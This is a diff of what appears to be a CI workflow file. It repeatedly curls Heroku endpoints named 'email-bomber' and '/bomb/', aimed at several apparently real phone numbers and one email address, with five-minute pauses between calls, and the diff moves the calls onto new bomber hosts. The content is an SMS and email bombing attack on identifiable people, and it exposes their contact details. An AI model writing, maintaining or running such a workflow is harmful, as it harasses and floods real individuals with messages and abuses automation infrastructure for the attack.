@@ -22,19 +22,19 @@ jobs:
         curl https://xlr8-sh.herokuapp.com/
         curl https://email-bomber.herokuapp.com/bomb/punya.bhasin@dpssl.net
         sleep 300
-        curl https://xlr8-sh.herokuapp.com/bomb/9891110582
+        curl https://newxxlr81.herokuapp.com/bomb/9891110582
         sleep 300
-        curl https://xlr8-sh.herokuapp.com/
+        curl https://newxxlr83.herokuapp.com/
         sleep 300
-        curl https://xlr8-sh.herokuapp.com/bomb/9811354915
+        curl https://newxxlr82.herokuapp.com/bomb/9811354915
         sleep 300
-        curl https://xlr8-sh.herokuapp.com/
+        curl https://newxxlr85.herokuapp.com/
         sleep 300
-        curl https://xlr8-sh.herokuapp.com/bomb/9711996166
+        curl https://newxxlr84.herokuapp.com/bomb/9711996166
         sleep 300
         echo https://xlr8-sh.herokuapp.com/bomb/7808850437
-        curl https://xlr8-sh.herokuapp.com/bomb/7600888111
+        curl https://newxxlr82.herokuapp.com/bomb/7600888111
         sleep 300
-        curl https://xlr8-sh.herokuapp.com/bomb/9818270056
+        curl https://newxxlr81.herokuapp.com/bomb/9818270056
         echo compleated 
         date
